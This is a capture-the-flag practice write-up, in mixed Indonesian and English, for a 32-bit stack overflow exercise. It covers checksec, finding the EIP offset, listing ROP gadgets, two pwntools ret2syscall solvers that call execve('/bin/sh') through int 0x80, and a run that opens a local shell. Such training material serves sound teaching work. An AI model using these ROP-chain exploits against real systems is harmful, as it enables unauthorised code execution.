---
slug: "pwn-ret2syscall"
title: "ret2syscall"
competition: "Exercise"
category: "Pwn"
difficulty: "Easy"
date: "2026-08-18"
updated: "2026-08-24"
summary: "Latihan buat persiapan seleksi LKS, isinya ret2syscall."
tags: ["PWN","ROP","HANDS-ON","EASY","X86","RET2SYSCALL"]
status: "published"
flag: "SHELL"
attachments: []
source: "https://claritys.web.id/writeups/pwn-ret2syscall"
---

# ret2syscall

> Latihan buat persiapan seleksi LKS, isinya ret2syscall.

DIawal, kita sudah diberi hint bahwa challenge ini itu ret2syscall. Langsung saja kita checksec.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2syscall main*
❯ checksec log_conver_32_patched                                                 󰥔 18:42:40
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2syscall/log_conver_32_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
```

Honestly, at first I confused, because how can i check the main function

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2syscall main*
❯ pwndbg log_conver_32_patched                                                   󰥔 18:43:40
info fun
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.01ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from log_conver_32_patched...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.cachyos.org>
  <https://debuginfod.archlinux.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in log_conver_32_patched)
gef➤  info fun
All defined functions:

Non-debugging symbols:
0x08049090  printf@plt
0x080490a0  gets@plt
0x080490b0  puts@plt
0x080490c0  __libc_start_main@plt
0x080490d0  setvbuf@plt
gef➤
```

Because it was stripped 😭

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2syscall main*
❯ file log_conver_32_patched                                                     󰥔 18:43:54
log_conver_32_patched: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=d0f8b984e3cc9fd525b741164708bb57a4ff0ab4, for GNU/Linux 3.2.0, stripped
```

Okay, and now we search for the offset for the EIP.

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x23
$ebx   : 0x6161616c ("laaa"?)
$ecx   : 0xf7f7b888  →  0x00000000
$edx   : 0xf7f7b888  →  0x00000000
$esp   : 0xffffd1d0  →  "oaaapaaaqaaara"
$ebp   : 0x6161616d ("maaa"?)
$esi   : 0xf7f79e2c  →  0x00292d4c ("L-)"?)
$edi   : 0x08049300  →   endbr32
$eip   : 0x6161616e ("naaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd1d0│+0x0000: "oaaapaaaqaaara"     ← $esp
0xffffd1d4│+0x0004: "paaaqaaara"
0xffffd1d8│+0x0008: "qaaara"
0xffffd1dc│+0x000c: 0xf7006172 ("ra"?)
0xffffd1e0│+0x0010: 0x00000001
0xffffd1e4│+0x0014: 0xffffd2a4  →  0xffffd4a0  →  "/home/claritys/ctf/pwncheatsheet/learnfromLKS/Bina[...]"
0xffffd1e8│+0x0018: 0xffffd2ac  →  0xffffd50c  →  "LC_MONETARY=en_US.UTF-8"
0xffffd1ec│+0x001c: 0x00000000
────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616e
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "log_conver_32_p", stopped 0x6161616e in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────
gef➤  cyclic -l naaa
Finding cyclic pattern of 4 bytes: b'naaa' (hex: 0x6e616161)
Found at offset 52
gef➤
```

Nah, kalau untuk ret2syscall itu caranya mirip mirip sama gitu dengan x64 (64 bit), karena dia membutuhkan pop gitu. Sooo… kita mencari registernya eax dulu, tapi harusnya kalau x64 kita nyari RDI dulu (ASUMSI (tolong koreksi dong bagi yang baca WU pls)).

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2syscall main*
❯ ropper --file log_conver_32 --search "pop"                                     󰥔 19:00:06
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: log_conver_32
0x08049251: pop eax; ret;
0x0804923c: pop ebp; cld; leave; ret;
0x0804925d: pop ebp; ret;
0x08049360: pop ebx; pop esi; pop edi; pop ebp; ret;
0x08049022: pop ebx; ret;
0x08049255: pop ecx; ret;
0x08049362: pop edi; pop ebp; ret;
0x08049257: pop edx; ret;
0x08049361: pop esi; pop edi; pop ebp; ret;
```

Setelah kita lihat, kita dapat banyak pop yang diperlukan untuk melakukan chaining. My own solver: (actually I’m using template from pwninit and then i modifed it a bit for my own environment)

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("log_conver_32_patched")

exe = context.binary
context.terminal = ["ghostty", "-e"]

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    binsh = next(elf.search(b'/bin/sh\x00')) #gomen, yang ini aku liat original solver :D
    chaining = flat(
        0x08049251, #EAX
        0xB, #value yang nanti bakal masuk ke EAX (hex)
        0x08049022,#EBX
        binsh,
        0x08049255, #EXC
        0x0,
        0x08049257, #EDX
        0x0,
			  0x08049259 #int 80
)
    payload = b'A' * 52
    payload += chaining
    # good luck pwning :)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

[https://x86.syscall.sh/](https://x86.syscall.sh/) Kurang lebih detailnya ada di link itu kalau 32 bit. Kita tinggal cari function yang avaliable untuk run. Di case ini, aku ngambil execve yang langsung dari kernel. Why? Karena tadi aku ngeliat di readelf itu nggak ada execve aslinya. Kalau execve tidak ada, itu baru ORW (Open, Read, Write).

Solver resmi dari latihan LKS nya adalah:

```python
from pwn import *

elf = context.binary = ELF('./log_conver_32')
p = process()

# ROP 32-bit
#eax = p32(0x08049251) # 0x08049251 : pop eax ; ret
#edx = p32(0x08049257) # 0x08049253 : pop edx ; ret
#ebx = p32(0x08049022) # 0x08049022 : pop ebx ; ret
#ecx = p32(0x08049255) # 0x08049256 : pop ecx ; ret
#something = p32(0x08049259) # 0x08049258 : int 0x80
offset = 52

#shell = next(elf.search(b'/bin/sh\x00'))

rop = ROP(elf)
eax = rop.find_gadget(['pop eax', 'ret'])[0]
ebx = rop.find_gadget(['pop ebx', 'ret'])[0]
ecx = rop.find_gadget(['pop ecx', 'ret'])[0]
edx = rop.find_gadget(['pop edx', 'ret'])[0]
something = rop.find_gadget(['int 0x80'])[0]

shell = next(elf.search(b'/bin/sh\x00'))

payload = flat(
     'A' * offset,
     eax, p32(11),
     ebx, p32(shell),
     ecx, p32(0),
     edx, p32(0),
     something
)

#p.clean()
p.sendlineafter(b'> ', payload)
p.interactive()
```

we can keep it and use it as a reference in the future.

**Implement:**

```bash
~/ctf/pwncheatsheet/latihanpwnlks/Binary_Exploit/Hands-on/ROP/ret2syscall main*
❯ python3 solve32.py LOCAL                                                                                                                                                       󰥔 21:45:40
[*] '/home/claritys/ctf/pwncheatsheet/latihanpwnlks/Binary_Exploit/Hands-on/ROP/ret2syscall/log_conver_32_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
[+] Starting local process '/home/claritys/ctf/pwncheatsheet/latihanpwnlks/Binary_Exploit/Hands-on/ROP/ret2syscall/log_conver_32_patched': pid 3733998
[*] Switching to interactive mode
Yui: Lylera, sistem utama lagi maintenance.
Yui: Tolong masukin log manual ya di sini.
Lylera:
> Yui: Log udah aku simpan. Makasih!
$ ls
log_conver.zip    log_conver_32_patched  log_conver_64_patched  solve64.py
log_conver_32     log_conver_64          solve.py
log_conver_32.py  log_conver_64.py       solve32.py
```
